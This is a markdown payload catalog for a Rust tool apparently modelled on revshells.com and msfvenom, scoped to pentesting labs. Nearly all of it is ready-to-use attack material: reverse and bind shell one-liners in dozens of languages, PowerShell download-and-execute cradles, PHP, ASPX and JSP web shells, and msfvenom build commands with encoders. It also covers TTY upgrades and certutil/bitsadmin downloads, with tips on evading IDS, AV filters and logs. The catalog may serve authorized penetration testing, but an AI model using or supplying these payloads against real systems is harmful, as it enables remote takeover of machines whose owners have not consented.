# shrike — Payload Catalog

Reference catalog for shrike's built-in payload generator (revshells.com + msfvenom, in Rust).
Every entry uses consistent fields so a struct can be generated 1:1 from a row/block.

**Scope:** authorized pentesting / OSCP lab work only.

## Placeholder convention

| Placeholder | Meaning | Example |
|---|---|---|
| `{lhost}` | attacker/listener IP | `10.10.14.7` |
| `{lport}` | attacker/listener port | `4444` |
| `{shell}` | target shell path | `/bin/bash`, `/bin/sh`, `cmd.exe` |
| `{path}` | file path on target/URL path | `/tmp/f`, `shell.php` |
| `{url}` | full source URL for transfers | `http://10.10.14.7/x` |

**Rust field schema (per entry):**
```
id: &str            // kebab-slug, unique
name: &str          // display name
os: Os              // Linux | Windows | Macos | Any
kind: Kind          // ReverseShell | BindShell | WebShell | Stager | FileTransfer | Persistence
lang: Lang          // see enum below
template: &str      // exact text with {lhost} {lport} {shell} {path}
notes: &str
listener: &str      // matching catch command
```
`lang` enum: bash, sh, powershell, cmd, python, python3, php, perl, ruby, nodejs, java, jsp, aspx, war, golang, c, csharp, lua, awk, socat, netcat, ncat, telnet, openssl, groovy, vbscript, jscript, msfvenom.

---

## Global listener quick reference

| Listener | Command | Use with |
|---|---|---|
| netcat | `nc -lvnp {lport}` | most reverse shells |
| rlwrap+nc | `rlwrap -cAr nc -lvnp {lport}` | arrow-key history before TTY upgrade |
| ncat | `ncat -lvnp {lport}` | ncat payloads |
| ncat TLS | `ncat --ssl -lvnp {lport}` | encrypted ncat |
| socat (raw TTY) | `socat file:$(tty),raw,echo=0 tcp-listen:{lport}` | socat TTY-stable shells |
| socat (plain) | `socat - tcp-listen:{lport}` | plain socat |
| openssl | `openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}` | openssl-encrypted |
| msf handler | `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <p>; set LHOST {lhost}; set LPORT {lport}; run"` | meterpreter/msfvenom |
| python http | `python3 -m http.server 80` | file transfer source |
| smbserver | `impacket-smbserver share . -smb2support` | SMB file transfer |

**openssl cert (one-time, for the openssl entries):**
```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

# 1. Reverse shells

## Bash

### `rev-bash-devtcp` — Bash /dev/tcp
- **os:** linux · **kind:** reverse-shell · **lang:** bash
- **template:**
  ```
  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
  ```
- **notes:** Needs bash compiled with `/dev/tcp` (Debian/Ubuntu `sh` is dash — will NOT work; call `bash` explicitly). `>&` and `0>&1` must not be shell-escaped away. If pasted into a `sh -c "..."`, wrap as `bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`.
- **listener:** `nc -lvnp {lport}`

### `rev-bash-5` — Bash exec fd 5 (read-loop)
- **os:** linux · **kind:** reverse-shell · **lang:** bash
- **template:**
  ```
  exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done
  ```
- **notes:** Works where `>&` redirection is filtered. Line-buffered; no job control.
- **listener:** `nc -lvnp {lport}`

### `rev-bash-196` — Bash fd 196
- **os:** linux · **kind:** reverse-shell · **lang:** bash
- **template:**
  ```
  0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; bash <&196 >&196 2>&196
  ```
- **notes:** Alternate FD number avoids collisions with fd 0/1/2.
- **listener:** `nc -lvnp {lport}`

### `rev-bash-udp` — Bash UDP
- **os:** linux · **kind:** reverse-shell · **lang:** bash
- **template:**
  ```
  bash -i >& /dev/udp/{lhost}/{lport} 0>&1
  ```
- **notes:** Catch with `nc -u -lvnp {lport}`. Useful when TCP egress is filtered but UDP is open.
- **listener:** `nc -u -lvnp {lport}`

## sh / POSIX

### `rev-sh-i` — sh -i redirect
- **os:** linux · **kind:** reverse-shell · **lang:** sh
- **template:**
  ```
  sh -i >& /dev/tcp/{lhost}/{lport} 0>&1
  ```
- **notes:** Only works if `sh` is bash. On dash use the mkfifo variant below.
- **listener:** `nc -lvnp {lport}`

## Netcat

### `rev-nc-e` — nc -e
- **os:** linux · **kind:** reverse-shell · **lang:** netcat
- **template:**
  ```
  nc -e {shell} {lhost} {lport}
  ```
- **notes:** `-e` only on traditional/OpenBSD-nc-with-gaping builds; absent in most modern distros. `{shell}` = `/bin/sh` or `/bin/bash`.
- **listener:** `nc -lvnp {lport}`

### `rev-nc-c` — nc -c
- **os:** linux · **kind:** reverse-shell · **lang:** netcat
- **template:**
  ```
  nc -c {shell} {lhost} {lport}
  ```
- **notes:** GNU netcat variant of `-e`.
- **listener:** `nc -lvnp {lport}`

### `rev-nc-mkfifo` — nc without -e (mkfifo trick)
- **os:** linux · **kind:** reverse-shell · **lang:** netcat
- **template:**
  ```
  rm -f {path};mkfifo {path};cat {path}|{shell} -i 2>&1|nc {lhost} {lport} >{path}
  ```
- **notes:** The go-to when `-e` is unavailable. `{path}` = `/tmp/f`. Removes the FIFO first to avoid "file exists".
- **listener:** `nc -lvnp {lport}`

### `rev-nc-mknod` — nc mknod named pipe
- **os:** linux · **kind:** reverse-shell · **lang:** netcat
- **template:**
  ```
  rm -f {path};mknod {path} p;{shell} -i <{path} 2>&1|nc {lhost} {lport} >{path}
  ```
- **notes:** `mknod ... p` alternative to `mkfifo` when mkfifo is missing.
- **listener:** `nc -lvnp {lport}`

### `rev-ncat` — Ncat
- **os:** any · **kind:** reverse-shell · **lang:** ncat
- **template:**
  ```
  ncat {lhost} {lport} -e {shell}
  ```
- **notes:** Nmap's ncat; `-e` always supported. Windows: `{shell}`=`cmd.exe`.
- **listener:** `ncat -lvnp {lport}`

### `rev-ncat-ssl` — Ncat TLS
- **os:** any · **kind:** reverse-shell · **lang:** ncat
- **template:**
  ```
  ncat --ssl {lhost} {lport} -e {shell}
  ```
- **notes:** Encrypts the channel; defeats plaintext IDS. Must catch with `--ssl`.
- **listener:** `ncat --ssl -lvnp {lport}`

## Socat

### `rev-socat-plain` — Socat plain
- **os:** linux · **kind:** reverse-shell · **lang:** socat
- **template:**
  ```
  socat tcp-connect:{lhost}:{lport} exec:{shell},pty,stderr,setsid,sigint,sane
  ```
- **notes:** Requires socat on target (upload static binary if absent, `/tmp/socat`).
- **listener:** `socat - tcp-listen:{lport}`

### `rev-socat-tty` — Socat fully-stable TTY
- **os:** linux · **kind:** reverse-shell · **lang:** socat
- **template:**
  ```
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}
  ```
- **notes:** Delivers a full interactive PTY immediately (tab-complete, ctrl-C, vim, history) — no manual TTY upgrade needed. `pty,stderr,setsid,sigint,sane` are all required.
- **listener:** `socat file:$(tty),raw,echo=0 tcp-listen:{lport}`

## Python

### `rev-python3` — Python3 one-liner (pty.spawn)
- **os:** linux · **kind:** reverse-shell · **lang:** python3
- **template:**
  ```
  python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{shell}")'
  ```
- **notes:** `pty.spawn` already gives a semi-interactive shell. Use `python` instead of `python3` on old boxes. Double-quotes around `{lhost}` mandatory; `{lport}` is bare int.
- **listener:** `nc -lvnp {lport}`

### `rev-python3-noport-quote` — Python3 short (no pty)
- **os:** linux · **kind:** reverse-shell · **lang:** python3
- **template:**
  ```
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["{shell}","-i"])'
  ```
- **notes:** No PTY — dumb shell (upgrade separately). Works where `pty` import is restricted.
- **listener:** `nc -lvnp {lport}`

### `rev-python-windows` — Python (Windows)
- **os:** windows · **kind:** reverse-shell · **lang:** python
- **template:**
  ```
  python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"
  ```
- **notes:** No `pty` on Windows. Outer double-quotes, inner single.
- **listener:** `nc -lvnp {lport}`

## PHP

### `rev-php-exec` — PHP fsockopen+exec
- **os:** linux · **kind:** reverse-shell · **lang:** php
- **template:**
  ```
  php -r '$sock=fsockopen("{lhost}",{lport});exec("{shell} -i <&3 >&3 2>&3");'
  ```
- **notes:** `<&3` assumes the socket is fd 3 (usually true for a fresh php -r). If `exec` disabled, try `system`/`shell_exec`/`passthru`/`popen` variants below.
- **listener:** `nc -lvnp {lport}`

### `rev-php-system` — PHP fsockopen+system
- **os:** linux · **kind:** reverse-shell · **lang:** php
- **template:**
  ```
  php -r '$sock=fsockopen("{lhost}",{lport});system("{shell} -i <&3 >&3 2>&3");'
  ```
- **notes:** Fallback when `exec` is in `disable_functions` but `system` isn't.
- **listener:** `nc -lvnp {lport}`

### `rev-php-proc-open` — PHP proc_open
- **os:** linux · **kind:** reverse-shell · **lang:** php
- **template:**
  ```
  php -r '$s=fsockopen("{lhost}",{lport});$p=proc_open("{shell} -i",array(0=>$s,1=>$s,2=>$s),$pipes);'
  ```
- **notes:** Most robust; survives when the simpler ones don't map fds correctly. Good for web-shell context.
- **listener:** `nc -lvnp {lport}`

## Perl

### `rev-perl` — Perl socket
- **os:** linux · **kind:** reverse-shell · **lang:** perl
- **template:**
  ```
  perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'
  ```
- **notes:** Present on nearly every Linux. `{lport}` bare int, `{lhost}` quoted.
- **listener:** `nc -lvnp {lport}`

### `rev-perl-noexec` — Perl no-`sh` (Windows-friendly)
- **os:** windows · **kind:** reverse-shell · **lang:** perl
- **template:**
  ```
  perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
  ```
- **notes:** Uses IO::Socket, no fork; works on Strawberry/ActivePerl.
- **listener:** `nc -lvnp {lport}`

## Ruby

### `rev-ruby` — Ruby socket
- **os:** linux · **kind:** reverse-shell · **lang:** ruby
- **template:**
  ```
  ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)'
  ```
- **notes:** `{lport}` bare int. `.to_i` yields the fd for the sprintf redirect.
- **listener:** `nc -lvnp {lport}`

### `rev-ruby-windows` — Ruby (Windows, no fd)
- **os:** windows · **kind:** reverse-shell · **lang:** ruby
- **template:**
  ```
  ruby -rsocket -e 'c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```
- **notes:** For Windows where fd-redirect exec doesn't work.
- **listener:** `nc -lvnp {lport}`

## PowerShell

### `rev-powershell-tcpclient` — PowerShell TCPClient one-liner
- **os:** windows · **kind:** reverse-shell · **lang:** powershell
- **template:**
  ```
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```
- **notes:** Reference one-liner adds `$client=` assignment (the revshells.com version omits it — a bug where `$stream` is undefined). Prefer the base64 form below for AV/quoting safety. `%{0}` array-fill is intentional.
- **listener:** `nc -lvnp {lport}`

### `rev-powershell-b64` — PowerShell base64 (-EncodedCommand)
- **os:** windows · **kind:** reverse-shell · **lang:** powershell
- **template:**
  ```
  powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64}
  ```
- **notes:** `{b64}` = UTF-16LE base64 of the TCPClient script. Generate: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))` (or Linux `iconv -t UTF-16LE | base64 -w0`). Avoids all quoting/escaping traps; evades naive keyword filters.
- **listener:** `nc -lvnp {lport}`

### `rev-powershell-nishang` — Nishang Invoke-PowerShellTcp style
- **os:** windows · **kind:** reverse-shell · **lang:** powershell
- **template:**
  ```
  IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}
  ```
- **notes:** Requires hosting Nishang's Invoke-PowerShellTcp.ps1. Append the invocation line to the script when serving to auto-run.
- **listener:** `nc -lvnp {lport}`

## cmd / batch

### `rev-cmd-nc` — cmd via nc.exe
- **os:** windows · **kind:** reverse-shell · **lang:** cmd
- **template:**
  ```
  nc.exe {lhost} {lport} -e cmd.exe
  ```
- **notes:** Needs nc.exe uploaded. `-e` present in the classic Windows netcat build.
- **listener:** `nc -lvnp {lport}`

## Telnet

### `rev-telnet-2port` — Telnet dual-port
- **os:** linux · **kind:** reverse-shell · **lang:** telnet
- **template:**
  ```
  telnet {lhost} {lport} | {shell} | telnet {lhost} {lport2}
  ```
- **notes:** Needs TWO listeners on two ports ({lport}, {lport2}): one feeds stdin, the other reads stdout. Legacy fallback when nothing else exists.
- **listener:** `nc -lvnp {lport}` and `nc -lvnp {lport2}`

### `rev-telnet-mknod` — Telnet mknod
- **os:** linux · **kind:** reverse-shell · **lang:** telnet
- **template:**
  ```
  rm -f {path};mknod {path} p && telnet {lhost} {lport} 0<{path} | {shell} 1>{path}
  ```
- **notes:** Single-port version using a FIFO.
- **listener:** `nc -lvnp {lport}`

## OpenSSL (encrypted)

### `rev-openssl` — OpenSSL s_client encrypted
- **os:** linux · **kind:** reverse-shell · **lang:** openssl
- **template:**
  ```
  mkfifo {path}; {shell} -i < {path} 2>&1 | openssl s_client -quiet -connect {lhost}:{lport} > {path}; rm {path}
  ```
- **notes:** Full TLS encryption of the shell. **Listener side needs a cert** (see Global section) and uses `s_server`, not nc. `{path}` = `/tmp/s`.
- **listener:** `openssl s_server -quiet -key key.pem -cert cert.pem -port {lport}`

## awk

### `rev-awk` — awk gawk /inet
- **os:** linux · **kind:** reverse-shell · **lang:** awk
- **template:**
  ```
  awk 'BEGIN {s = "/inet/tcp/0/{lhost}/{lport}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ```
- **notes:** Requires **gawk** (mawk lacks `/inet`). Non-interactive command loop.
- **listener:** `nc -lvnp {lport}`

## lua

### `rev-lua` — Lua socket
- **os:** linux · **kind:** reverse-shell · **lang:** lua
- **template:**
  ```
  lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}','{lport}');os.execute('{shell} -i <&3 >&3 2>&3');"
  ```
- **notes:** Needs luasocket. `{lport}` quoted here (string arg to connect).
- **listener:** `nc -lvnp {lport}`

### `rev-lua5.1` — Lua 5.1 alt
- **os:** linux · **kind:** reverse-shell · **lang:** lua
- **template:**
  ```
  lua5.1 -e 'local host, port = "{lhost}", {lport} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) end'
  ```
- **notes:** Command-loop variant, no os.execute redirect.
- **listener:** `nc -lvnp {lport}`

## NodeJS

### `rev-nodejs-exec` — Node child_process shim
- **os:** any · **kind:** reverse-shell · **lang:** nodejs
- **template:**
  ```
  require('child_process').exec('nc -e {shell} {lhost} {lport}')
  ```
- **notes:** Just shells out to nc — needs nc with `-e`. Use the full-socket form below when nc absent.
- **listener:** `nc -lvnp {lport}`

### `rev-nodejs-net` — Node pure-socket
- **os:** any · **kind:** reverse-shell · **lang:** nodejs
- **template:**
  ```
  (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("{shell}",[]);var client=new net.Socket();client.connect({lport},"{lhost}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
  ```
- **notes:** No external nc dependency; works cross-platform (`{shell}`=`/bin/sh` or `cmd.exe`).
- **listener:** `nc -lvnp {lport}`

## Golang

### `rev-golang` — Go net.Dial
- **os:** linux · **kind:** reverse-shell · **lang:** golang
- **template:**
  ```
  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
  ```
- **notes:** Needs Go toolchain on target (rare). More useful cross-compiled: `GOOS=windows GOARCH=amd64 go build`.
- **listener:** `nc -lvnp {lport}`

## C

### `rev-c` — C reverse shell (compile)
- **os:** linux · **kind:** reverse-shell · **lang:** c
- **template:**
  ```c
  #include <stdio.h>
  #include <sys/socket.h>
  #include <sys/types.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  int main(void){
    int port = {lport};
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{lhost}");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2);
    char * const argv[] = {"{shell}", NULL};
    execvp("{shell}", argv);
    return 0;
  }
  ```
- **notes:** Compile: `gcc rev.c -o rev && ./rev`. Use for restricted environments or when scripting langs are stripped.
- **listener:** `nc -lvnp {lport}`

## Java

### `rev-java-runtime` — Java Runtime.exec
- **os:** any · **kind:** reverse-shell · **lang:** java
- **template:**
  ```java
  String host="{lhost}";
  int port={lport};
  String[] cmd={"{shell}","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"};
  Runtime.getRuntime().exec(cmd);
  ```
- **notes:** The `/dev/tcp` payload only works on Linux targets (needs bash). For Windows Java, spawn `cmd.exe` and pipe streams manually (see JSP below).
- **listener:** `nc -lvnp {lport}`

## C#

### `rev-csharp` — C# TcpClient
- **os:** windows · **kind:** reverse-shell · **lang:** csharp
- **template:**
  ```csharp
  using System;using System.Text;using System.IO;using System.Diagnostics;using System.Net.Sockets;
  class R{static void Main(){
    using(TcpClient c=new TcpClient("{lhost}",{lport})){
      Stream s=c.GetStream();StreamReader rd=new StreamReader(s);
      byte[] b=new byte[1024];int i;
      Process p=new Process();
      p.StartInfo.FileName="cmd.exe";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;
      p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;
      p.Start();
      // wire p.StandardOutput/Input to s
    }}}
  ```
- **notes:** Skeleton — full stream-pumping loop needed. Prefer `msfvenom -f csharp` or an Invoke-style payload for production.
- **listener:** `nc -lvnp {lport}`

---

# 2. Bind shells

| id | os | lang | template | notes | listener |
|---|---|---|---|---|---|
| `bind-nc-e` | linux | netcat | `nc -lvnp {lport} -e {shell}` | Target listens; you connect in. Needs `-e`. | `nc {rhost} {lport}` |
| `bind-nc-mkfifo` | linux | netcat | `rm -f {path};mkfifo {path};cat {path}\|{shell} -i 2>&1\|nc -lvnp {lport} >{path}` | No-`-e` bind variant. | `nc {rhost} {lport}` |
| `bind-ncat` | any | ncat | `ncat -lvnp {lport} -e {shell}` | Windows `{shell}`=cmd.exe. | `ncat {rhost} {lport}` |
| `bind-socat` | linux | socat | `socat tcp-listen:{lport},reuseaddr,fork exec:{shell},pty,stderr,setsid,sigint,sane` | Stable TTY bind. | `socat file:$(tty),raw,echo=0 tcp:{rhost}:{lport}` |
| `bind-python3` | linux | python3 | `python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{lport}));s.listen(1);(c,a)=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn("{shell}")'` | Listens on target. | `nc {rhost} {lport}` |
| `bind-perl` | linux | perl | `perl -e 'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{shell} -i");};'` | Classic perl bind. | `nc {rhost} {lport}` |
| `bind-powershell` | windows | powershell | `powershell -NoP -Exec Bypass -C "$l=New-Object System.Net.Sockets.TcpListener('0.0.0.0',{lport});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` | Windows bind. `{rhost}`=target IP. | `nc {rhost} {lport}` |

**Note:** for bind shells `{rhost}` (target IP) is what you connect to; there is no `{lhost}` in the payload.

---

# 3. Web shells

### `web-php-cmd` — Minimal PHP cmd param
- **os:** any · **kind:** web-shell · **lang:** php
- **template:**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- **notes:** Invoke `?cmd=id`. Variants: `passthru`, `shell_exec`, `exec`, `` `$_GET[cmd]` `` (backticks). URL-encode spaces (`%20`). Save as `.php` (or `.phtml`, `.php5` to bypass filters).
- **listener:** browser / `curl 'http://{rhost}/{path}?cmd=id'`

### `web-php-post` — PHP POST (stealthier)
- **os:** any · **kind:** web-shell · **lang:** php
- **template:**
  ```php
  <?php if(isset($_POST['c'])){echo "<pre>".shell_exec($_POST['c'])."</pre>";} ?>
  ```
- **notes:** POST body keeps commands out of access logs. `curl -d 'c=id' http://{rhost}/{path}`.
- **listener:** `curl -d 'c=id' http://{rhost}/{path}`

### `web-php-oneliner-eval` — PHP eval (weevely/antsword style)
- **os:** any · **kind:** web-shell · **lang:** php
- **template:**
  ```php
  <?php @eval($_POST['x']); ?>
  ```
- **notes:** Pairs with China-Chopper/AntSword clients. Extremely small — good for filtered upload fields.
- **listener:** AntSword / custom POST

### `web-aspx-cmd` — ASPX cmd
- **os:** windows · **kind:** web-shell · **lang:** aspx
- **template:**
  ```aspx
  <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
  <% string c=Request["cmd"]; if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");} %>
  ```
- **notes:** IIS/.NET. Invoke `?cmd=whoami`. Save as `.aspx`.
- **listener:** browser / curl

### `web-asp-classic` — Classic ASP cmd
- **os:** windows · **kind:** web-shell · **lang:** aspx
- **template:**
  ```asp
  <% Set o=Server.CreateObject("WScript.Shell"):Set r=o.Exec("cmd /c "&Request.QueryString("cmd")):Response.Write("<pre>"&r.StdOut.ReadAll()&"</pre>") %>
  ```
- **notes:** Old IIS with classic ASP. Save as `.asp`.
- **listener:** browser / curl

### `web-jsp-cmd` — JSP cmd
- **os:** any · **kind:** web-shell · **lang:** jsp
- **template:**
  ```jsp
  <%@ page import="java.util.*,java.io.*"%><% if(request.getParameter("cmd")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream())); String s=""; out.print("<pre>"); while((s=d.readLine())!=null){out.println(s);} out.print("</pre>"); } %>
  ```
- **notes:** Tomcat/JBoss. `exec(String)` splits on spaces — for complex cmds use `exec(new String[]{"/bin/sh","-c",cmd})`. Deploy inside a WAR or drop in webroot.
- **listener:** browser / curl

---

# 4. msfvenom

### Conventions
- `-p <payload>` payload; `LHOST=` / `LPORT=` set inline after the payload.
- `-f <format>` output format; `-o <file>` output file.
- `-a x86|x64` arch; `--platform windows|linux|...`.
- `-b '\x00\x0a\x0d'` badchars to avoid; `-e <encoder>` (e.g. `x86/shikata_ga_nai`); `-i <n>` iterations.
- `EXITFUNC=thread` (default for exploits, cleaner) | `process` | `seh` — set to `thread` to avoid crashing the host process on shell exit.
- Staged `payload/x/y/z` (uses `multi/handler` to send 2nd stage) vs stageless `payload/x/y_z` (self-contained; `_` instead of last `/`).
- List formats: `msfvenom --list formats`; list payloads: `msfvenom --list payloads`.

### Payload strings + example commands

| Payload `-p` | Typical build command |
|---|---|
| `windows/x64/meterpreter/reverse_tcp` | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -f exe -o shell.exe` |
| `windows/x64/shell_reverse_tcp` | `msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -f exe -o rev.exe` |
| `linux/x64/shell_reverse_tcp` | `msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o rev.elf` |
| `php/meterpreter_reverse_tcp` (stageless) | `msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.php` |
| `java/jsp_shell_reverse_tcp` | `msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o shell.jsp` |
| `windows/x64/meterpreter/reverse_https` | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lhost} LPORT={lport} EXITFUNC=thread -f exe -o https.exe` |

**Notes on specific payloads:**
- `php/meterpreter_reverse_tcp` output is raw PHP but **without** a leading `<?php` guard sometimes — prepend `<?php` if the target requires it; catch with handler `PAYLOAD php/meterpreter_reverse_tcp`.
- `java/jsp_shell_reverse_tcp` → drop the `.jsp` in webroot, catch with plain `nc -lvnp {lport}` (it's a shell, not meterpreter).
- `reverse_https` beacons over TLS; must catch with the matching handler (not nc). Great for egress-filtered nets.

### Format / flag matrix

| `-f` format | Produces | Common use | Catch with |
|---|---|---|---|
| `exe` | Windows PE exe | drop & run on Windows | handler / nc per payload |
| `dll` | Windows DLL | DLL hijack / rundll32 | handler |
| `elf` | Linux executable | drop & run on Linux | nc / handler |
| `raw` | raw shellcode/script bytes | php/jsp/py payloads, further encoding | per payload |
| `psh` | PowerShell script | fileless PS execution | handler |
| `hta-psh` | .hta (PowerShell) | HTA phishing / mshta | handler |
| `msi` | Windows installer | `msiexec /quiet /i x.msi` | handler |
| `war` | Java WAR | Tomcat manager deploy | nc (for jsp_shell) |
| `aspx` | ASP.NET page | IIS upload | handler / nc |
| `py` | Python script | cross-platform | per payload |
| `c` | C shellcode array | embed in C loader | n/a (compile) |

**Encoding / badchar example (OSCP-classic, avoid nulls):**
```
msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -i 5 -f c
```

**WAR + jsp_shell for Tomcat:**
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war   # deploy, browse to it, catch with nc -lvnp {lport}
```

---

# 5. TTY upgrade sequence

Full "dumb shell → fully interactive PTY" dance:

**Step 1 — spawn a PTY (pick one available on target):**
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
python -c 'import pty; pty.spawn("/bin/bash")'
# or
/usr/bin/script -qc /bin/bash /dev/null
# or (no python/script)
perl -e 'exec "/bin/bash";'
```

**Step 2 — background the shell:**
```
Ctrl-Z
```

**Step 3 — on your local box, fix the terminal and foreground:**
```
stty raw -echo; fg
```
(You type `fg` "blind" — the shell echo is off. Press Enter, sometimes twice.)

**Step 4 — inside the returned shell, set the term type:**
```
export TERM=xterm
# or xterm-256color for colors
```

**Step 5 — match rows/cols so vim/less/clear render correctly.**
First, in a *separate local terminal*, read your real size:
```
stty size          # prints:  rows cols   e.g.  38 190
```
Then in the reverse shell:
```
stty rows 38 columns 190
```

**One-glance recap:**
```
# in shell:   python3 -c 'import pty;pty.spawn("/bin/bash")'
# press:       Ctrl-Z
# local:       stty raw -echo; fg
# in shell:    export TERM=xterm; stty rows <R> columns <C>
```

**Notes / traps:**
- If you exit the shell without restoring, your local terminal is left in raw mode — run `reset` or `stty sane` to recover.
- `stty raw -echo` disables local echo & line-buffering so Ctrl-C/tab/arrows pass through to the remote PTY.
- socat `rev-socat-tty` skips ALL of this — it hands you a proper PTY on first connect.
- `rlwrap -cAr nc -lvnp {lport}` gives arrow-key history even before upgrading (good pre-step).

---

# 6. File transfer to target

### Windows — download to disk

| id | tool | template | notes |
|---|---|---|---|
| `ft-certutil` | certutil | `certutil -urlcache -split -f "{url}" {path}` | LOLBin, on every Windows. Also base64-decode: `certutil -decode in.b64 out.exe`. `-urlcache -f` caches; add `certutil -urlcache -split -f {url} delete` to clean. |
| `ft-bitsadmin` | bitsadmin | `bitsadmin /transfer job /download /priority high "{url}" {path}` | Legacy but widely present. `{path}` must be absolute (e.g. `C:\Windows\Temp\x.exe`). |
